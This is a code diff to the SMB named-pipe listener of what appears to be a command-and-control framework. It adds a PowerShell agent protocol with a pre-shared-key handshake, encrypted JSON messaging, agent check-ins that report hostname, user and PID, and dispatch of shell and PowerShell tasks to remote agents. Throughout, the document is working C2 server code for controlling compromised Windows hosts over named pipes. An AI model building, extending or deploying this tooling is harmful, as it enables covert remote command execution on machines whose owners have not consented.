@@ -2,20 +2,30 @@
 SMB named pipe listener.
 
 Runs an SMB server (via impacket) that accepts agent connections
-on a configurable named pipe. The protocol over the pipe is identical
-to the HTTPS listener: framed TLV packets with AES-GCM encryption.
+on a configurable named pipe.  Supports two protocols:
+
+  - C agent:  ECDH key-exchange + AES-GCM + binary TLV  (magic 0xDEADF00D)
+  - PS agent: PSK handshake + AES-256-CBC/HMAC-SHA256 + JSON  (magic "PS")
 
 Wire format on pipe: [4 bytes LE: length] [packet bytes]
 """
 
 import asyncio
+import base64
+import hashlib
+import hmac as _hmac
+import json
 import logging
+import secrets
 import socket
 import struct
 import threading
 from pathlib import Path
 from typing import Optional
 from uuid import UUID
+
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding as sym_padding
 
 from impacket import smbserver
 from impacket.ntlm import compute_lmhash, compute_nthash
@@ -41,10 +51,54 @@ from ..logging.operator_logger import OperatorLogger
 log = logging.getLogger(__name__)
 
 
+# ─── Shared framing helpers ───────────────────────────────────────────
+
+def _read_frame(conn: socket.socket, buf: bytearray) -> Optional[bytes]:
+    """Block-read one [4B len][payload] frame.  Returns payload or None on EOF."""
+    while True:
+        if len(buf) >= 4:
+            msg_len = struct.unpack_from("<I", buf, 0)[0]
+            if msg_len > 16 * 1024 * 1024:
+                buf.clear()
+                return None
+            total = 4 + msg_len
+            if len(buf) >= total:
+                payload = bytes(buf[4:total])
+                del buf[:total]
+                return payload
+        chunk = conn.recv(65536)
+        if not chunk:
+            return None
+        buf.extend(chunk)
+
+
+def _try_extract_frame(buf: bytearray) -> Optional[bytes]:
+    """Extract one frame already in *buf* without I/O."""
+    if len(buf) < 4:
+        return None
+    msg_len = struct.unpack_from("<I", buf, 0)[0]
+    if msg_len > 16 * 1024 * 1024:
+        buf.clear()
+        return None
+    total = 4 + msg_len
+    if len(buf) < total:
+        return None
+    payload = bytes(buf[4:total])
+    del buf[:total]
+    return payload
+
+
+def _frame(data: bytes) -> bytes:
+    """Wrap payload in [4-byte LE length][payload]."""
+    return struct.pack("<I", len(data)) + data
+
+
+# ─── C agent protocol handler ────────────────────────────────────────
+
 class SmbPipeHandler:
     """
-    Handles a single named pipe connection from an agent.
-    Called by the impacket SMB server's named pipe handler.
+    Handles a single named-pipe connection from a **C agent**.
+    Binary TLV packets with AES-GCM encryption.
     """
 
     def __init__(self, listener: "SmbListener"):
@@ -52,38 +106,13 @@ class SmbPipeHandler:
         self._buf = bytearray()
 
     def read_framed(self, data: bytes) -> Optional[bytes]:
-        """
-        Accumulate data and extract a complete framed message.
-        Frame: [4 bytes LE length] [payload]
-        Returns payload when complete, None if still accumulating.
-        """
         self._buf.extend(data)
-
-        if len(self._buf) < 4:
-            return None
-
-        msg_len = struct.unpack_from("<I", self._buf, 0)[0]
-        if msg_len > 16 * 1024 * 1024:  # Sanity: 16MB max
-            self._buf.clear()
-            return None
-
-        total_needed = 4 + msg_len
-        if len(self._buf) < total_needed:
-            return None
-
-        payload = bytes(self._buf[4:total_needed])
-        self._buf = self._buf[total_needed:]
-        return payload
+        return _try_extract_frame(self._buf)
 
     def frame_response(self, data: bytes) -> bytes:
-        """Frame a response with 4-byte LE length prefix."""
-        return struct.pack("<I", len(data)) + data
+        return _frame(data)
 
     def handle_packet(self, packet: bytes) -> Optional[bytes]:
-        """
-        Process a complete packet from the agent. Returns response packet.
-        This mirrors the HTTPS listener's _handle_request logic.
-        """
         if len(packet) < HEADER_SIZE:
             return None
 
@@ -114,13 +143,252 @@ class SmbPipeHandler:
             return None
 
 
+# ─── PowerShell agent protocol handler ───────────────────────────────
+
+class PsProtocolHandler:
+    """
+    Handles a **PowerShell agent** connection over named pipe.
+
+    Handshake:
+      Client → [PS 0x01 0x00][32 B nonce][32 B HMAC(nonce, PSK)]   (68 B)
+      Server → [OK 0x01 0x00][32 B server_nonce]                    (36 B)
+      session_key = SHA-256(PSK ‖ client_nonce ‖ server_nonce)
+
+    Messages (after handshake): AES-256-CBC + HMAC-SHA-256 encrypted JSON.
+      Wire: [16 B IV][ciphertext (PKCS-7)][32 B HMAC(IV‖CT)]
+
+    Agent → C2:
+      checkin  {"t":"ci","id":"<hex>","h":"HOST","u":"DOM\\user","p":PID,...}
+      result   {"t":"result","i":"<task_id>","o":"output","s":0|1}
+      heartbeat{"t":"hb"}
+
+    C2 → Agent:
+      tasks    {"t":"tasks","d":[{"i":"<id>","c":"shell|powershell|exit","a":"args"},...]}
+      ack      {"t":"ack"}
+    """
+
+    PS_MAGIC = b"\x50\x53"  # "PS"
+    OK_MAGIC = b"\x4F\x4B"  # "OK"
+
+    def __init__(self, listener: "SmbListener"):
+        self.listener = listener
+        self._session_key: Optional[bytes] = None
+        self._agent_id: Optional[str] = None
+        self._session: Optional[AgentSession] = None
+
+    # ── Handshake ─────────────────────────────────────────────────────
+
+    def handle_handshake(self, packet: bytes) -> Optional[bytes]:
+        """Verify PSK, derive session key.  Returns OK response or None."""
+        if len(packet) != 68:
+            log.warning(f"PS handshake bad length: {len(packet)}")
+            return None
+        if packet[:2] != self.PS_MAGIC:
+            return None
+
+        client_nonce = packet[4:36]
+        client_mac = packet[36:68]
+
+        # Find matching PSK
+        matched_psk = None
+        for psk in self.listener._ps_keys:
+            expected = _hmac.new(psk, client_nonce, hashlib.sha256).digest()
+            if _hmac.compare_digest(expected, client_mac):
+                matched_psk = psk
+                break
+
+        if matched_psk is None:
+            log.warning("PS handshake failed — no matching PSK")
+            return None
+
+        # Derive session key
+        server_nonce = secrets.token_bytes(32)
+        self._session_key = hashlib.sha256(
+            matched_psk + client_nonce + server_nonce
+        ).digest()
+
+        log.info("[+] PS handshake authenticated")
+        return self.OK_MAGIC + b"\x01\x00" + server_nonce
+
+    # ── Crypto ────────────────────────────────────────────────────────
+
+    def decrypt(self, data: bytes) -> Optional[bytes]:
+        """Decrypt AES-256-CBC + HMAC-SHA-256.  [16 IV][CT][32 MAC]"""
+        if len(data) < 49:
+            return None
+        iv = data[:16]
+        mac_recv = data[-32:]
+        ct = data[16:-32]
+
+        expected = _hmac.new(
+            self._session_key, iv + ct, hashlib.sha256
+        ).digest()
+        if not _hmac.compare_digest(expected, mac_recv):
+            log.warning("PS HMAC verification failed")
+            return None
+
+        try:
+            decryptor = Cipher(
+                algorithms.AES(self._session_key), modes.CBC(iv)
+            ).decryptor()
+            padded = decryptor.update(ct) + decryptor.finalize()
+
+            unpadder = sym_padding.PKCS7(128).unpadder()
+            return unpadder.update(padded) + unpadder.finalize()
+        except Exception as e:
+            log.warning(f"PS decrypt error: {e}")
+            return None
+
+    def encrypt(self, plaintext: bytes) -> bytes:
+        """Encrypt with AES-256-CBC + HMAC-SHA-256."""
+        iv = secrets.token_bytes(16)
+
+        padder = sym_padding.PKCS7(128).padder()
+        padded = padder.update(plaintext) + padder.finalize()
+
+        encryptor = Cipher(
+            algorithms.AES(self._session_key), modes.CBC(iv)
+        ).encryptor()
+        ct = encryptor.update(padded) + encryptor.finalize()
+
+        mac = _hmac.new(
+            self._session_key, iv + ct, hashlib.sha256
+        ).digest()
+        return iv + ct + mac
+
+    # ── Message dispatch ──────────────────────────────────────────────
+
+    def handle_message(self, data: bytes) -> Optional[bytes]:
+        """Decrypt → process → return encrypted response (or None)."""
+        pt = self.decrypt(data)
+        if pt is None:
+            return None
+        try:
+            msg = json.loads(pt.decode("utf-8"))
+        except (json.JSONDecodeError, UnicodeDecodeError) as e:
+            log.warning(f"PS bad JSON: {e}")
+            return None
+
+        t = msg.get("t")
+        if t == "ci":
+            return self._handle_checkin(msg)
+        elif t == "result":
+            return self._handle_result(msg)
+        elif t == "hb":
+            return self._handle_heartbeat()
+        else:
+            log.warning(f"PS unknown msg type: {t}")
+            return None
+
+    # ── Individual handlers ───────────────────────────────────────────
+
+    def _handle_checkin(self, msg: dict) -> bytes:
+        self._agent_id = msg.get("id", secrets.token_hex(16))
+
+        session = self.listener.session_manager.get(self._agent_id)
+        is_new = session is None
+        if not session:
+            session = AgentSession(agent_id=self._agent_id)
+            session.c2_channel = "SMB-PS"
+            session.listener_id = self.listener.listener_id
+            self.listener.session_manager.register(session)
+
+        self._session = session
+        session.hostname = msg.get("h", "")
+        session.username = msg.get("u", "")
+        session.pid = msg.get("p", 0)
+        session.arch = msg.get("a", "")
+        session.os_version = msg.get("o", "")
+        session.process_name = msg.get("n", "")
+        session.update_last_seen()
+
+        if is_new and session.hostname:
+            log.info(
+                f"[+] PS agent check-in: {session.hostname} "
+                f"({session.username}) PID:{session.pid}"
+            )
+            if self.listener._loop:
+                asyncio.run_coroutine_threadsafe(
+                    event_bus.emit(
+                        EventBus.AGENT_CHECKIN,
+                        session=session, is_new=True,
+                    ),
+                    self.listener._loop,
+                )
+
+        return self._tasks_response(session)
+
+    def _handle_result(self, msg: dict) -> None:
+        """Process task result.  Returns None — agent does not expect ACK."""
+        if not self._session:
+            return None
+
+        self._session.update_last_seen()
+        task_id = msg.get("i", "").replace("-", "")
+        output = msg.get("o", "")
+        status = msg.get("s", 0)
+
+        task = self._session.active_tasks.get(task_id)
+        if task:
+            result_data = (
+                output.encode("utf-8") if isinstance(output, str) else b""
+            )
+            self.listener.task_manager.mark_complete(
+                self._session, task, result_data, status == 0
+            )
+            self.listener.logger.log_result(
+                self._agent_id,
+                self._session.hostname,
+                task.task_id,
+                task.module_name,
+                task.status.name,
+                None,
+                output[:200] if output else "",
+            )
+            if self.listener._loop:
+                asyncio.run_coroutine_threadsafe(
+                    event_bus.emit(
+                        EventBus.TASK_RESULT,
+                        session=self._session,
+                        task=task,
+                    ),
+                    self.listener._loop,
+                )
+        return None  # no ACK — agent sends results then heartbeat
+
+    def _handle_heartbeat(self) -> bytes:
+        if self._session:
+            self._session.update_last_seen()
+            return self._tasks_response(self._session)
+        return self.encrypt(
+            json.dumps({"t": "tasks", "d": []}).encode()
+        )
+
+    def _tasks_response(self, session: AgentSession) -> bytes:
+        """Flush pending tasks → encrypted JSON response."""
+        tasks = self.listener.task_manager.flush_pending(session)
+        td = []
+        for task in tasks:
+            args = ""
+            if task.arguments:
+                args = task.arguments.decode("utf-8", errors="replace")
+            td.append({
+                "i": task.task_id.replace("-", ""),
+                "c": task.module_name or "shell",
+                "a": args,
+            })
+        return self.encrypt(json.dumps({"t": "tasks", "d": td}).encode())
+
+
+# ─── Listener ─────────────────────────────────────────────────────────
+
 class SmbListener(BaseListener):
     """
-    SMB named pipe listener using impacket.
+    SMB named-pipe listener using impacket.
 
-    The listener creates an SMB server that exposes a named pipe.
-    Agents connect to \\<ip>\pipe\<pipename> and communicate using
-    the same binary protocol as the HTTPS listener.
+    Exposes a named pipe via an SMB server.  Agents connect to
+    ``\\\\<ip>\\pipe\\<pipename>`` and speak either the binary C-agent
+    protocol or the JSON PowerShell-agent protocol.
     """
 
     def __init__(
@@ -134,6 +402,7 @@ class SmbListener(BaseListener):
         rsa_private_key_path: Optional[Path] = None,
         magic: int = DEFAULT_MAGIC,
         name: str = "",
+        ps_keys_dir: Optional[Path] = None,
     ):
         super().__init__(listener_id, "SMB", name=name or "SMB")
         self.pipe_name = pipe_name
@@ -142,6 +411,10 @@ class SmbListener(BaseListener):
         self.task_manager = task_manager
         self.logger = logger
         self.magic = magic
+
+        # PowerShell PSKs (loaded from disk + registered at runtime)
+        self._ps_keys: list[bytes] = []
+        self._ps_keys_dir = ps_keys_dir
 
         self._rsa_private_key = None
         if rsa_private_key_path and rsa_private_key_path.exists():
@@ -153,16 +426,44 @@ class SmbListener(BaseListener):
         self._tcp_thread: Optional[threading.Thread] = None
         self._loop: Optional[asyncio.AbstractEventLoop] = None
 
+    # ── PSK management ────────────────────────────────────────────────
+
+    def _load_ps_keys(self):
+        """Scan keys directory for ps_*.key files."""
+        if not self._ps_keys_dir or not self._ps_keys_dir.exists():
+            return
+        for key_file in sorted(self._ps_keys_dir.glob("ps_*.key")):
+            try:
+                data = key_file.read_bytes()
+                if len(data) == 32 and data not in self._ps_keys:
+                    self._ps_keys.append(data)
+                    log.debug(f"Loaded PS key: {key_file.name}")
+            except Exception as e:
+                log.warning(f"Failed to load PS key {key_file}: {e}")
+        if self._ps_keys:
+            log.info(f"[*] Loaded {len(self._ps_keys)} PowerShell PSK(s)")
+
+    def add_psk(self, key: bytes):
+        """Register a PSK at runtime (called by the generate command)."""
+        if len(key) == 32 and key not in self._ps_keys:
+            self._ps_keys.append(key)
+            log.info("[+] Registered new PowerShell PSK")
+
+    # ── Lifecycle ─────────────────────────────────────────────────────
+
     async def start(self):
         self._loop = asyncio.get_event_loop()
 
+        # Enable debug logging for impacket so we can see negotiate/auth
+        logging.getLogger("impacket").setLevel(logging.DEBUG)
+
+        # Load PowerShell PSKs from disk
+        self._load_ps_keys()
+
         # ── Local TCP server for impacket pipe forwarding ──
-        # impacket's registerNamedPipe maps a pipe name to a TCP
-        # address. When an agent opens the pipe, impacket connects
-        # to this TCP server and forwards all pipe I/O through it.
         self._tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self._tcp_server.bind(('127.0.0.1', 0))
+        self._tcp_server.bind(("127.0.0.1", 0))
         self._tcp_server.listen(8)
         tcp_port = self._tcp_server.getsockname()[1]
 
@@ -179,7 +480,7 @@ class SmbListener(BaseListener):
 
         # Register named pipe → impacket forwards pipe I/O to our TCP handler
         self._server.registerNamedPipe(
-            self.pipe_name, ('127.0.0.1', tcp_port)
+            self.pipe_name, ("127.0.0.1", tcp_port)
         )
 
         # Start SMB server in a thread
@@ -199,47 +500,6 @@ class SmbListener(BaseListener):
         except Exception as e:
             log.error(f"SMB server error: {e}")
             self.running = False
-
-    def _tcp_accept_loop(self):
-        """Accept TCP connections from impacket's pipe forwarder."""
-        while True:
-            try:
-                conn, _ = self._tcp_server.accept()
-                log.debug("Pipe TCP connection from impacket forwarder")
-                t = threading.Thread(
-                    target=self._tcp_pipe_handler,
-                    args=(conn,),
-                    daemon=True,
-                )
-                t.start()
-            except OSError:
-                break  # Socket closed in stop()
-
-    def _tcp_pipe_handler(self, conn: socket.socket):
-        """Handle pipe I/O forwarded from impacket for one agent session."""
-        handler = SmbPipeHandler(self)
-        conn.settimeout(300)  # 5 min idle timeout
-        try:
-            while True:
-                data = conn.recv(65536)
-                if not data:
-                    break
-
-                # Feed data; process every complete frame in the buffer
-                packet = handler.read_framed(data)
-                while packet is not None:
-                    response = handler.handle_packet(packet)
-                    if response is not None:
-                        framed = handler.frame_response(response)
-                        conn.sendall(framed)
-                    # Check for another complete frame already buffered
-                    packet = handler.read_framed(b"")
-        except socket.timeout:
-            log.debug("SMB pipe handler idle timeout")
-        except (ConnectionError, OSError) as e:
-            log.debug(f"SMB pipe handler closed: {e}")
-        finally:
-            conn.close()
 
     async def stop(self):
         self.running = False
@@ -265,7 +525,97 @@ class SmbListener(BaseListener):
             "status": "RUNNING" if self.running else "STOPPED",
         }
 
-    # ─── Protocol handlers (shared with SmbPipeHandler) ───
+    # ── TCP accept / pipe dispatch ────────────────────────────────────
+
+    def _tcp_accept_loop(self):
+        """Accept TCP connections from impacket's pipe forwarder."""
+        while True:
+            try:
+                conn, _ = self._tcp_server.accept()
+                log.debug("Pipe TCP connection from impacket forwarder")
+                t = threading.Thread(
+                    target=self._tcp_pipe_handler,
+                    args=(conn,),
+                    daemon=True,
+                )
+                t.start()
+            except OSError:
+                break  # Socket closed in stop()
+
+    def _tcp_pipe_handler(self, conn: socket.socket):
+        """Handle pipe I/O for one agent session.
+
+        Reads the first framed packet, inspects its first two bytes:
+          - ``PS`` (0x50 0x53) → PowerShell JSON protocol
+          - anything else      → C binary TLV protocol
+        """
+        conn.settimeout(300)  # 5 min idle timeout
+        buf = bytearray()
+
+        try:
+            # ── Read first frame to detect protocol ──
+            first = _read_frame(conn, buf)
+            if first is None:
+                return
+
+            if len(first) >= 2 and first[:2] == PsProtocolHandler.PS_MAGIC:
+                # ───────── PowerShell agent ─────────
+                ps = PsProtocolHandler(self)
+                resp = ps.handle_handshake(first)
+                if resp is None:
+                    log.warning("PS handshake failed — closing pipe")
+                    return
+                conn.sendall(_frame(resp))
+
+                # Encrypted JSON message loop
+                while True:
+                    frame = _read_frame(conn, buf)
+                    if frame is None:
+                        break
+                    resp = ps.handle_message(frame)
+                    if resp is not None:
+                        conn.sendall(_frame(resp))
+
+            else:
+                # ───────── C agent ─────────
+                handler = SmbPipeHandler(self)
+
+                # Process first packet
+                resp = handler.handle_packet(first)
+                if resp is not None:
+                    conn.sendall(_frame(resp))
+
+                # Feed any data left in buf from the initial read
+                if buf:
+                    handler._buf.extend(buf)
+                    buf.clear()
+                    packet = handler.read_framed(b"")
+                    while packet is not None:
+                        resp = handler.handle_packet(packet)
+                        if resp is not None:
+                            conn.sendall(_frame(resp))
+                        packet = handler.read_framed(b"")
+
+                # Continue reading from socket
+                while True:
+                    data = conn.recv(65536)
+                    if not data:
+                        break
+                    packet = handler.read_framed(data)
+                    while packet is not None:
+                        resp = handler.handle_packet(packet)
+                        if resp is not None:
+                            conn.sendall(_frame(resp))
+                        packet = handler.read_framed(b"")
+
+        except socket.timeout:
+            log.debug("SMB pipe handler idle timeout")
+        except (ConnectionError, OSError) as e:
+            log.debug(f"SMB pipe handler closed: {e}")
+        finally:
+            conn.close()
+
+    # ─── C-agent protocol handlers (shared with SmbPipeHandler) ───────
 
     def decrypt_and_identify(
         self, encrypted_payload: bytes
